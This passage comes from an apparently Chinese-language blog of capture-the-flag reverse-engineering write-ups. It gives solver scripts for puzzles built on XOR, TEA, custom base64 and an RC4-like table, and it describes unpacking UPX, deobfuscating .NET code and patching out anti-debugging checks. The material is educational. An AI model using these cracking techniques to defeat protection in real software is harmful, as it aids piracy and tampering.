class="number">7</span>] = <span class="number">406741500</span> / <span class="number">7532250</span></span><br><span class="line">flag[<span class="number">8</span>] = <span class="number">294236496</span> / <span class="number">5551632</span></span><br><span class="line">flag[<span class="number">9</span>] = <span class="number">177305856</span> / <span class="number">3409728</span></span><br><span class="line">flag[<span class="number">10</span>] = <span class="number">650683500</span> / <span class="number">13013670</span></span><br><span class="line">flag[<span class="number">11</span>] = <span class="number">298351053</span> / <span class="number">6088797</span></span><br><span class="line">flag[<span class="number">12</span>] = <span class="number">386348487</span> / <span class="number">7884663</span></span><br><span class="line">flag[<span class="number">13</span>] = <span class="number">438258597</span> / <span class="number">8944053</span></span><br><span class="line">flag[<span class="number">14</span>] = <span class="number">249527520</span> / <span class="number">5198490</span></span><br><span class="line">flag[<span class="number">15</span>] = <span class="number">445362764</span> / <span class="number">4544518</span></span><br><span class="line">flag[<span class="number">17</span>] = <span class="number">174988800</span> / <span class="number">3645600</span></span><br><span class="line">flag[<span class="number">16</span>] = <span class="number">981182160</span> / <span class="number">10115280</span></span><br><span class="line">flag[<span class="number">18</span>] = <span class="number">493042704</span> / <span class="number">9667504</span></span><br><span class="line">flag[<span class="number">19</span>] = <span class="number">257493600</span> / <span class="number">5364450</span></span><br><span class="line">flag[<span class="number">20</span>] = <span class="number">767478780</span> / <span class="number">13464540</span></span><br><span class="line">flag[<span class="number">21</span>] = <span class="number">312840624</span> / <span class="number">5488432</span></span><br><span class="line">flag[<span class="number">22</span>] = <span class="number">1404511500</span> / <span class="number">14479500</span></span><br><span class="line">flag[<span class="number">23</span>] = <span class="number">316139670</span> / <span class="number">6451830</span></span><br><span class="line">flag[<span class="number">24</span>] = <span class="number">619005024</span> / <span class="number">6252576</span></span><br><span class="line">flag[<span class="number">25</span>] = <span class="number">372641472</span> / <span class="number">7763364</span></span><br><span class="line">flag[<span class="number">26</span>] = <span class="number">373693320</span> / <span class="number">7327320</span></span><br><span class="line">flag[<span class="number">27</span>] = <span class="number">498266640</span> / <span class="number">8741520</span></span><br><span class="line">flag[<span class="number">28</span>] = <span class="number">452465676</span> / <span class="number">8871876</span></span><br><span class="line">flag[<span class="number">29</span>] = <span class="number">208422720</span> / <span class="number">4086720</span></span><br><span class="line">flag[<span class="number">30</span>] = <span class="number">515592000</span> / <span class="number">9374400</span></span><br><span class="line">flag[<span class="number">31</span>] = <span class="number">719890500</span> / <span class="number">5759124</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">map</span>(<span class="built_in">chr</span>, flag)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(flag)</span><br></pre></td></tr></table></figure><br><h3 id="FlareOn4-login-javascript"><a href="#FlareOn4-login-javascript" class="headerlink" title="[FlareOn4]login | javascript"></a>[FlareOn4]login | javascript</h3><p>又是一个走错片场的题目，文本编辑器打开 html，可以看到一段 javascript 写的检查 flag 的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;prompt&quot;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>).value;</span><br><span class="line"><span class="keyword">var</span> rotFlag = flag.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>) ? c : c - <span class="number">26</span>);&#125;);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;</span><br><span class="line">alert(<span class="string">&quot;Correct flag!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">alert(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用正则表达式来匹配所有大小写，将其 “右移” 13 位，妥妥的恺撒加密，懒得写脚本了，上 <a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">网站</a></p><br><h3 id="V-amp-N2020-公开赛-strangeCpp-x86-exe"><a href="#V-amp-N2020-公开赛-strangeCpp-x86-exe" class="headerlink" title="[V&amp;N2020 公开赛]strangeCpp | x86,exe"></a>[V&amp;N2020 公开赛]strangeCpp | x86,exe</h3><p>shift +F12，查找字符串 “flag{…}” 的交叉引用，找到函数 sub_140013AA0，开头有一串 putchar 输出 welcome 的地方：</p><p><img src="../img/VN2020%E5%85%AC%E5%BC%80%E8%B5%9BstrangeCpp/1.png" alt="VN2020公开赛strangeCpp"></p><p>随便点一个 byte_… 跟过去，可以发现一个长度为 17 的可疑字符数组：</p><p><img src="../img/VN2020%E5%85%AC%E5%BC%80%E8%B5%9BstrangeCpp/2.png" alt="VN2020公开赛strangeCpp"></p><p>查找交叉引用，找到关键函数 sub_140013580：</p><p><img src="../img/VN2020%E5%85%AC%E5%BC%80%E8%B5%9BstrangeCpp/3.png" alt="VN2020公开赛strangeCpp"></p><p>通过 <code>result == 607052314</code>，与逆向 sub_140011384 函数可以确定 key 的值，sub_140011384 逻辑如下：</p><p><img src="../img/VN2020%E5%85%AC%E5%BC%80%E8%B5%9BstrangeCpp/4.png" alt="VN2020公开赛strangeCpp"></p><p>爆破呗，因为 python 的 int 类型没有位数限制，在左移 8 位和乘 291 时都不存在截断和溢出，所以需要手动给他截断一下（&amp; 0xFFFFFFFF）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14549744</span>):</span><br><span class="line"><span class="keyword">if</span> ((i &lt;&lt; <span class="number">8</span>) ^ (i &gt;&gt; <span class="number">12</span>)) * <span class="number">291</span> &amp; <span class="number">0xFFFFFFFF</span> == <span class="number">607052314</span>:</span><br><span class="line">key = i</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Key: &quot;</span> + <span class="built_in">str</span>(key)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;26 2C 21 27 3B 0D 04 75 68 34 28 25 0E 35 2D 69 3D&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">table = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> table]</span><br><span class="line"></span><br><span class="line">flag = [<span class="string">&#x27;&#x27;</span>] * <span class="built_in">len</span>(table)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">flag[i] = <span class="built_in">chr</span>(table[i] ^ key &amp; <span class="number">0xFF</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(flag)</span><br></pre></td></tr></table></figure><p>输出为</p><ul><li>Key: 123456</li><li>flag{MD5(theNum)}</li></ul><p>md5 一下 key 就是 flag 了</p><br><h3 id="BJDCTF2020-easy-x86-exe-patch"><a href="#BJDCTF2020-easy-x86-exe-patch" class="headerlink" title="[BJDCTF2020]easy | x86,exe,patch"></a>[BJDCTF2020]easy | x86,exe,patch</h3><p>main 函数啥事没干，函数列表里翻一翻，找到一个可疑函数 ques。分析后发现该函数不要求输入，却在不停输出，那就在 main 里 patch 一下，让执行流顺路执行该函数：</p><p><img src="../img/BJDCTF2020easy/1.png" alt="BJDCTF2020easy"></p><p>运行一下得到 flag：</p><p><img src="../img/BJDCTF2020easy/2.png" alt="BJDCTF2020easy"></p><p>不 patch 也是可以的，exe 也没有开基址重定位，OD 动态调试时直接修改 eip 到该函数即可</p><br><h3 id="ACTF新生赛2020-usualCrypt-x86-exe-变种base64"><a href="#ACTF新生赛2020-usualCrypt-x86-exe-变种base64" class="headerlink" title="[ACTF新生赛2020]usualCrypt | x86,exe,变种base64"></a>[ACTF新生赛2020]usualCrypt | x86,exe,变种base64</h3><p>main 函数逻辑很简单，就是将输入丢到 sub_401080 函数处理，结果与 byte_40E0E4 字符数组逐字节比较。</p><p>sub_401080 函数主体是个 base64 编码，这一点从编码表 byte_40E0A0 不难看出。但是在编码开始前，该函数调用了 sub_401000 对编码表进行了变换，OD 可以调出来：</p><p><img src="../img/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020usualCrypt/1.png" alt="ACTF新生赛2020usualCrypt"></p><p>编码结束后，调用 sub_401030 对编码的结果进行大小写的翻转：</p><p><img src="../img/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020usualCrypt/2.png" alt="ACTF新生赛2020usualCrypt"></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">new_table = <span class="string">&quot;ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">target = <span class="string">&quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot;</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> target:</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">tmp = <span class="built_in">ord</span>(i) - <span class="number">32</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;A&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">tmp = <span class="built_in">ord</span>(i) + <span class="number">32</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">tmp = <span class="built_in">ord</span>(i)</span><br><span class="line">res += <span class="built_in">chr</span>(tmp)</span><br><span class="line"></span><br><span class="line">general = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">general += old_table[new_table.find(i)]</span><br><span class="line"><span class="built_in">print</span> base64.b64decode(general)</span><br></pre></td></tr></table></figure><br><h3 id="V-amp-N2020-公开赛-CSRe-x86-exe-NET-混淆"><a href="#V-amp-N2020-公开赛-CSRe-x86-exe-NET-混淆" class="headerlink" title="[V&amp;N2020 公开赛]CSRe | x86,exe,.NET,混淆"></a>[V&amp;N2020 公开赛]CSRe | x86,exe,.NET,混淆</h3><p>怎么看出有混淆的呢？用 Reflector 打开后发现类名都是不可见字符，还有一堆莫名其妙的计算函数，经验告诉我它被混淆了，当然也可以用诸如 Exeinfo PE 这样的工具来检查</p><p>.NET 框架的程序去混淆需要用到 <strong>de4dot</strong>，你可以在 <a href="https://github.com/de4dot/de4dot">github</a> 下载源码来编译最新版，也可以下载别人已经编译好的 <a href="https://www.52pojie.cn/thread-1045680-1-1.html">稍旧一些的版本</a>，使用方法就是 <code>de4dot.exe xxx.exe</code>，会在当前目录下生成 xxx-cleaned.exe</p><p>去混淆后再用 Reflector 打开，找到 main 函数：</p><p><img src="../img/VN2020%E5%85%AC%E5%BC%80%E8%B5%9BCSRe/1.png" alt="VN2020公开赛CSRe"></p><p>两个 sha1 拿去网站一查，一个是 314159，另一个是 return，所以 str 和 str2 分别是 1415 和 turn</p><br><h3 id="MRCTF2020-Transform-x86-exe"><a href="#MRCTF2020-Transform-x86-exe" class="headerlink" title="[MRCTF2020]Transform | x86,exe"></a>[MRCTF2020]Transform | x86,exe</h3><p>main 逻辑挺简单的，直接上脚本吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="string">&quot;67 79 7B 7F 75 2B 3C 52 53 79 57 5E 5D 42 7B 2D 2A 66 42 7E 4C 57 79 41 6B 7E 65 3C 5C 45 6F 62 4D&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">target = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> target]</span><br><span class="line">table = [<span class="number">9</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">24</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">3</span>, <span class="number">17</span>, <span class="number">32</span>, <span class="number">29</span>, <span class="number">11</span>, <span class="number">30</span>, <span class="number">27</span>, <span class="number">22</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">2</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">31</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">14</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">33</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">flag[table[i]] = table[i] ^ target[i]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, flag))</span><br></pre></td></tr></table></figure><br><h3 id="GWCTF-2019-xxor-x86-elf-tea"><a href="#GWCTF-2019-xxor-x86-elf-tea" class="headerlink" title="[GWCTF 2019]xxor | x86,elf,tea"></a>[GWCTF 2019]xxor | x86,elf,tea</h3><p>main 函数分析并还原符号：</p><p><img src="../img/GWCTF2019xxor/1.png" alt="GWCTF2019xxor"></p><p>普通 tea 解密很简单，完全反过来就行（C++ 32位）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TeaDecode</span><span class="params">(<span class="keyword">unsigned</span>* cipher, <span class="keyword">unsigned</span>* key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum&#123; <span class="number">0x458BCD42</span> * <span class="number">64</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> lowWord = *cipher;</span><br><span class="line"><span class="keyword">unsigned</span> highWord = cipher[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">highWord -= (lowWord + sum + <span class="number">20</span>) ^ ((lowWord &lt;&lt; <span class="number">6</span>) + key[<span class="number">2</span>]) ^ ((lowWord &gt;&gt; <span class="number">9</span>) + key[<span class="number">3</span>]) ^ <span class="number">0x10</span>;</span><br><span class="line">lowWord -= (highWord + sum + <span class="number">11</span>) ^ ((highWord &lt;&lt; <span class="number">6</span>) + *key) ^ ((highWord &gt;&gt; <span class="number">9</span>) + key[<span class="number">1</span>]) ^ <span class="number">0x20</span>;</span><br><span class="line">sum -= <span class="number">0x458BCD42</span>;</span><br><span class="line">&#125;</span><br><span class="line">*cipher = lowWord;</span><br><span class="line">cipher[<span class="number">1</span>] = highWord;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Check 函数解一个三元一次方程组（注意溢出与截断）：<br><img src="../img/GWCTF2019xxor/2.png" alt="GWCTF2019xxor"></p><p>有：</p><ul><li>target[2] = 3774025685</li><li>target[3] = 1548802262</li><li>target[4] = 2652626477</li></ul><p>脚本（C++ 32位）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> target[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">target[<span class="number">2</span>] = <span class="number">3774025685</span>;</span><br><span class="line">target[<span class="number">3</span>] = <span class="number">1548802262</span>;</span><br><span class="line">target[<span class="number">4</span>] = <span class="number">2652626477</span>;</span><br><span class="line"></span><br><span class="line">target[<span class="number">0</span>] = <span class="number">0xDF48EF7E</span>;</span><br><span class="line">target[<span class="number">5</span>] = <span class="number">0x84F30420</span>;</span><br><span class="line">target[<span class="number">1</span>] = <span class="number">0x20CAACF4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> key[]&#123; <span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">TeaDecode</span>(target + i, key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> i : target) &#123;</span><br><span class="line">std::cout &lt;&lt; std::hex &lt;&lt; i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出为 666c61677b72655f69735f6772656174217d，python2 中 decode(“hex”) 一下得到 flag</p><br><h3 id="HDCTF2019-Maze-x86-exe-upx-maze"><a href="#HDCTF2019-Maze-x86-exe-upx-maze" class="headerlink" title="[HDCTF2019]Maze | x86,exe,upx,maze"></a>[HDCTF2019]Maze | x86,exe,upx,maze</h3><p>upx 解压缩后，main 函数由于存在花指令，导致 ida 无法解析：</p><p><img src="../img/HDCTF2019Maze/1.png" alt="HDCTF2019Maze"></p><p>Undefine 以后将 0xE8 nop 掉</p><p><img src="../img/HDCTF2019Maze/2.png" alt="HDCTF2019Maze"></p><p>在 0x90 处按 ‘c’ 将数据强转成代码，之后在 main 函数开始处按 ‘p’ 形成函数，就可以 F5 了：</p><p><img src="../img/HDCTF2019Maze/3.png" alt="HDCTF2019Maze"></p><p>反编译：</p><p><img src="../img/HDCTF2019Maze/4.png" alt="HDCTF2019Maze"></p><p>由于没有对迷宫的点是否可以通行进行判断，所以存在很多种路径都输出答案正确的情况</p><p>shift + F12 可以找到长度为 70 的迷宫：</p><p><img src="../img/HDCTF2019Maze/5.png" alt="HDCTF2019Maze"></p><p>当顶边 * 侧边为 10 * 7 时，满足终点在 (5，-4) 的要求，还原二维迷宫：<br><img src="../img/HDCTF2019Maze/6.png" alt="HDCTF2019Maze"></p><p>所以正确的路径为 ssaaasaassdddw</p><br><h3 id="BJDCTF2020-BJD-hamburger-competition-x86-exe-NET-Unity游戏"><a href="#BJDCTF2020-BJD-hamburger-competition-x86-exe-NET-Unity游戏" class="headerlink" title="[BJDCTF2020]BJD hamburger competition | x86,exe,.NET,Unity游戏"></a>[BJDCTF2020]BJD hamburger competition | x86,exe,.NET,Unity游戏</h3><p>作者脑洞可以嗷。玩过 Unity 游戏开发的应该清楚，生成游戏时，开发者写的所有 C# 类会被整合编译到 <strong>Assembly-CSharp.dll</strong> 里，该动态链接库所在的路径是 xxx_Data\Managed，其中 xxx 为游戏名。</p><p>这题的 dll 就在 BJD hamburger competition_Data\Managed 目录下，Reflector 打开该 dll，在 ButtonSpawnFruit 类中找到 Spawn 方法：</p><p><img src="../img/BJDCTF2020BJDhamburgercompetition/1.png" alt="BJDCTF2020BJDhamburgercompetition"></p><p>网站上查下这个 sha1，得到 1001，先看看他写的 Md5：</p><p><img src="../img/BJDCTF2020BJDhamburgercompetition/2.png" alt="BJDCTF2020BJDhamburgercompetition"></p><p>那就取 1001 的 md5 大写前 20 个字符作为 flag</p><br><h3 id="WUSTCTF2020-level1-x86-elf"><a href="#WUSTCTF2020-level1-x86-elf" class="headerlink" title="[WUSTCTF2020]level1 | x86,elf"></a>[WUSTCTF2020]level1 | x86,elf</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read().split(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">data = <span class="built_in">map</span>(<span class="built_in">int</span>, data)</span><br><span class="line">data = [<span class="number">0</span>] + data</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line"><span class="keyword">if</span> i &amp; <span class="number">1</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(data[i] &gt;&gt; i)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(data[i] / i)</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><br><h3 id="WUSTCTF2020-level2-x86-elf-upx"><a href="#WUSTCTF2020-level2-x86-elf-upx" class="headerlink" title="[WUSTCTF2020]level2 | x86,elf,upx"></a>[WUSTCTF2020]level2 | x86,elf,upx</h3><p>upx 解压缩后，main 函数的汇编中可以看到 flag</p><br><h3 id="crackMe-x86-exe-反调试"><a href="#crackMe-x86-exe-反调试" class="headerlink" title="crackMe | x86,exe,反调试"></a>crackMe | x86,exe,反调试</h3><p>整理一下 main 函数的逻辑，根据各变量、函数行为给他们加符号：</p><p><img src="../img/crackMe/1.png" alt="crackMe"></p><p>CheckValid 函数基本没啥用，用来检测输入长度和输入字符的合法性，PreparePrint 函数准备输出，Congratulation 存放在 v7，失败的字符串存放在 v5。PrepareTable 函数通过输入的 user 来变换加密表，该函数可以通过 python 模拟：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PrepareTable</span>(<span class="params">user</span>):</span></span><br><span class="line">user  = <span class="built_in">map</span>(<span class="built_in">ord</span>, user)</span><br><span class="line">table = <span class="built_in">range</span>(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">v5, v9, v6 = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> v5 &lt; <span class="number">256</span>:</span><br><span class="line">v3 = table[v5]</span><br><span class="line">v9 = (v9 + v3 + user[v6 % <span class="built_in">len</span>(user)]) &amp; <span class="number">0xFF</span></span><br><span class="line">v4 = table[v9]</span><br><span class="line">table[v9] = v3</span><br><span class="line">table[v5] = v4</span><br><span class="line">v5 += <span class="number">1</span></span><br><span class="line">v6 += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> table</span><br><span class="line"></span><br><span class="line">userName = <span class="string">&quot;welcomebeijing&quot;</span></span><br><span class="line">table = PrepareTable(userName)</span><br></pre></td></tr></table></figure><p>CheckPassword 函数里面有三处反调试，检测到有调试痕迹时，会进入误导的分支：</p><p><img src="../img/crackMe/2.png" alt="crackMe"></p><p>把它们 patch 掉以后，先来看上面的 while 循环：</p><p><img src="../img/crackMe/3.png" alt="crackMe"></p><p>好麻烦，不想静态分析了，上 OD 吧，密码一栏输 1234abcdABCD，等 while 跳出看看 v15 里的值：</p><p><img src="../img/crackMe/4.png" alt="crackMe"></p><p>可以看到 12 个字符变成了 6 个字节，每两个字符凑成一个字节。下一个 while 循环：</p><p><img src="../img/crackMe/5.png" alt="crackMe"></p><p>其中 sub_401710 函数经过动态调试后发现不会对 target 数组或者 user 产生任何影响，该循环干的事就是给长度为 8 的 target 数组赋值，每次赋值一字节，根据上一个 while 循环可以推出输入的密码长度为 16。</p><p>最后的 sub_401470 函数用来检查 target 数组是否满足要求：</p><p><img src="../img/crackMe/6.png" alt="crackMe"></p><p>该函数对 target 数组进行逐字节检查：</p><p><img src="../img/crackMe/7.png" alt="crackMe"></p><p>需要注意，在检查 target[5] 时存在反调试的混淆信息。由此函数可得 target = [100, 98, 97, 112, 112, 115, 101, 99]，再逆一下第二个 while 循环即可得到 password，完整脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PrepareTable</span>(<span class="params">user</span>):</span></span><br><span class="line">user  = <span class="built_in">map</span>(<span class="built_in">ord</span>, user)</span><br><span class="line">table = <span class="built_in">range</span>(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">v5, v9, v6 = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> v5 &lt; <span class="number">256</span>:</span><br><span class="line">v3 = table[v5]</span><br><span class="line">v9 = (v9 + v3 + user[v6 % <span class="built_in">len</span>(user)]) &amp; <span class="number">0xFF</span></span><br><span class="line">v4 = table[v9]</span><br><span class="line">table[v9] = v3</span><br><span class="line">table[v5] = v4</span><br><span class="line">v5 += <span class="number">1</span></span><br><span class="line">v6 += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> table</span><br><span class="line"></span><br><span class="line">userName = <span class="string">&quot;welcomebeijing&quot;</span></span><br><span class="line">table = PrepareTable(userName)</span><br><span class="line"></span><br><span class="line">target = [<span class="number">100</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">112</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>]</span><br><span class="line"></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">v12, v13, v3, v4 = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">v13 += <span class="number">1</span></span><br><span class="line">v12 = (v12 + table[v13]) &amp; <span class="number">0xFF</span></span><br><span class="line">v3 = table[v13]</span><br><span class="line">v4 = table[v12]</span><br><span class="line">table[v12] = v3</span><br><span class="line">table[v13] = v4</span><br><span class="line">password += <span class="string">&quot;%02x&quot;</span> % (target[i] ^ table[(v3 + v4) &amp; <span class="number">0xFF</span>])</span><br><span class="line"><span class="built_in">print</span> password</span><br></pre></td></tr></table></figure><br><h3 